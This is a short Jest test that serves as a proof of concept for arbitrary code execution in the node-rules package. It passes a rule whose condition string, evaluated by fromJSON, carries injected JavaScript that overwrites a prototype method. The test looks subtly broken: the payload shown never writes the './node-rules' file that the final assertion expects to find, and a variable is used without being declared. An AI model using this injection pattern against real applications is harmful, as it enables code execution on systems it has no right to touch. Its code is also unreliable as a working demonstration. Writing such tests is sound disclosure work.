test("Arbitrary code execution in node-rules", () => {
  expect.assertions(2);
  const fs = require("fs");
  const A = require("node-rules");
  const path = "./node-rules";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    var rules = {
      condition: "{}.__proto__.toString = 222",
      consequence: "throw new Error()",
    };
    var a = new A();
    a.fromJSON(rules);
  } catch (error) {
    console.log("Start Error")
    console.log(error)
    console.log("End Error");
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
